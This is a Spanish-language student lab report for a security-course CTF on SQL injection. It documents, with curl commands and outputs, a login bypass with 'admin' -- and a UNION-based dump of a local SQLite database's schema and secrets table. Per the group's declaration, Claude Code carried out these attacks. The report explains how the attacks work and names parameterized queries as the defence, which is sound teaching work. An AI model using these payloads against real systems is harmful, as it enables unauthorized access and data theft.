# Informe — Laboratorio 07 · Explotación

**Grupo:** 08 · **Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919 · **Fecha:** 30/10/2026

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Ejecución de los dos ataques de SQL injection (R1 bypass de login, R2 extracción con UNION) contra el target; borrador de la redacción de esas filas de la tabla de explotación y de P1 y P2. | `informe.md`: filas de SQLi auth y SQLi UNION de la tabla, sus evidencias, P1 y P2. | Las salidas pegadas en la sección 2 son las reales de la terminal. Las flags se validaron con `./ctf submit 07`. No se leyó el código del target (`server.py`) ni ningún `solucion.md`: la consulta subyacente se dedujo desde afuera, a partir de los mensajes de error SQL que devuelve el propio servidor. |

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Flags capturadas

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ·  R3     Inyeccion de comandos (RCE)
   ·  R4     Path traversal / LFI
   ·  R5     IDOR - control de acceso roto

  ████████████░░░░░░░░░░░░░░░░░░  2/5 (40%)
```

---

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi — bypass de autenticación (`POST /login`, campo `user`) | `admin' --` | `SELECT ... FROM users WHERE user='admin' --' AND pass='x'` | Acceso como **admin** sin conocer su contraseña: el panel de administración se desbloquea (`FLAG{sqli_auth_bypass}`). Es acceso total a la cuenta de mayor privilegio de la aplicación. | **Consultas parametrizadas** (prepared statements): el input viaja como *parámetro*, nunca concatenado al string SQL. Además, hash de contraseñas y no exponer mensajes de error SQL al cliente. |
| SQLi — extracción con UNION (`GET /buscar?q=`) | `zzz' UNION SELECT clave, valor FROM secrets-- -` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%zzz%' UNION SELECT clave, valor FROM secrets-- -%'` | Lectura de una tabla arbitraria de la base (`secrets`), que no tiene nada que ver con el buscador. Devuelve `FLAG{sqli_union_dump}`. El mismo vector permite leer `users` (incluido `pass` y `nota_privada`). Es exfiltración de toda la base de datos. | Igual que arriba: **consultas parametrizadas**. El buscador no debe permitir que el input altere la estructura de la consulta. Principio de mínimo privilegio en el usuario de la DB. |

### 2.1 R1 — Bypass de autenticación por SQLi

Login normal como baseline: con una contraseña cualquiera, rechaza.

```
$ curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin" --data-urlencode "pass=cualquiera"
Credenciales invalidas
```

Payload `admin' --` en `user` (comenta el chequeo de `pass`):

```
$ curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin' --" --data-urlencode "pass=x"
Bienvenido admin (rol: admin).
Panel de administracion desbloqueado: FLAG{sqli_auth_bypass}
```

### 2.2 R2 — Extracción de datos con UNION

Primero se confirma que el parámetro es inyectable provocando un error SQL con una comilla:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=Router'"
Error SQL: unrecognized token: "'"
```

El servidor es verboso con los errores a propósito, así que los usamos para afinar. Se cuenta el número de columnas con `ORDER BY` hasta que falla:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 2-- -"
Resultados:
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 3-- -"
Error SQL: 1st ORDER BY term out of range - should be between 1 and 2
```

`ORDER BY 3` falla → la consulta devuelve **2 columnas**. Con eso, un `UNION SELECT` de dos columnas se anexa sin error. Se enumera el esquema leyendo `sqlite_master`:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -"
Resultados:
  productos - $CREATE TABLE productos(nombre TEXT, precio TEXT)
  secrets - $CREATE TABLE secrets(clave TEXT, valor TEXT)
  users - $CREATE TABLE users(id INTEGER, user TEXT, pass TEXT, rol TEXT, nota_privada TEXT)
```

Conocidas las columnas de `secrets` (`clave`, `valor`), se vuelca la tabla:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets-- -"
Resultados:
  flag_union - $FLAG{sqli_union_dump}
```

El `zzz` inicial es un término que no matchea ningún producto, así que la única fila que vuelve es la del `UNION`. El mismo payload cambiando `secrets` por `users` deja leer usuarios, contraseñas y la `nota_privada`.

---

## 3. Preguntas de análisis

**P1 — Por qué funciona el bypass del R1 y qué hace el `--`.**

La consulta del login arma el string pegando el input del usuario, algo como:

```
SELECT user, rol FROM users WHERE user='<user>' AND pass='<pass>'
```

Al mandar `admin' --` en `user`, queda:

```
SELECT user, rol FROM users WHERE user='admin' --' AND pass='x'
```

Dos cosas pasan. La comilla `'` que escribimos **cierra** la cadena del nombre de usuario justo después de `admin`, así que `user='admin'` queda completo y bien formado. Y `--` es el inicio de un **comentario de línea en SQL**: todo lo que va después en esa línea (`' AND pass='x'`) el motor lo ignora por completo. El resultado es que la consulta que realmente se ejecuta es `... WHERE user='admin'`, sin ninguna comprobación de contraseña. La base devuelve la fila del admin, la app asume "login válido" y nos deja entrar. Nuestro dato (el texto del campo usuario) dejó de ser un dato y pasó a ser parte del código de la consulta: esa es la esencia de la inyección.

**P2 — Por qué el UNION necesita el mismo número de columnas y cómo averiguarlo.**

`UNION` combina los resultados de dos `SELECT` en una sola tabla de salida, apilando las filas del segundo debajo de las del primero. Para que eso tenga sentido, las dos consultas tienen que producir filas de la **misma forma**: el mismo número de columnas, y en posiciones compatibles. Si la primera devuelve 2 columnas y nosotros anexamos un `SELECT` de 3, el motor no sabe cómo alinearlas y tira un error de "SELECTs to the left and right of UNION do not have the same number of result columns". Por eso el `UNION SELECT` tiene que tener exactamente 2 columnas acá.

Si no supiéramos que son dos, hay dos formas de averiguarlo, las dos las usamos o están disponibles:

1. **`ORDER BY n` incremental.** Se pide ordenar por la columna 1, la 2, la 3... `ORDER BY` por número de columna funciona mientras esa columna exista; en cuanto se pasa, el motor responde "ORDER BY term out of range". El último número que **no** da error es la cantidad de columnas. Acá `ORDER BY 2` anduvo y `ORDER BY 3` falló → 2 columnas.
2. **`UNION SELECT NULL, NULL, ...`** probando con 1, 2, 3 `NULL` hasta que deja de dar error de "número de columnas distinto". `NULL` sirve porque es compatible con cualquier tipo.

**P3 — El R3 (command injection / RCE).**

*(pendiente — parte del compañero que haga R3)*

**P4 — Por qué parametrizar mata la SQLi de raíz.**

*(pendiente)*

**P5 — El IDOR (R5) y dónde va el control de acceso.**

*(pendiente)*

---

## 4. Bitácora de comandos

```bash
# Sin Docker en la máquina, el target se levantó en local (mismo server.py del contenedor):
#   mkdir /c/app && cp server.py /c/app/ && (cd /c/app && python server.py)   # escucha en :80

# R1 — SQLi bypass de autenticación
curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin" --data-urlencode "pass=cualquiera"  # baseline: rechaza
curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin' --" --data-urlencode "pass=x"       # entra como admin

# R2 — SQLi extracción con UNION
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=Router"                               # baseline
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=Router'"                              # confirma inyectable (error SQL)
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 2-- -"                    # 2 columnas OK
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 3-- -"                    # falla -> son 2
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -"  # esquema
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets-- -"                        # dump

./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
./ctf submit 07 R2 'FLAG{sqli_union_dump}'
./ctf status 07
```
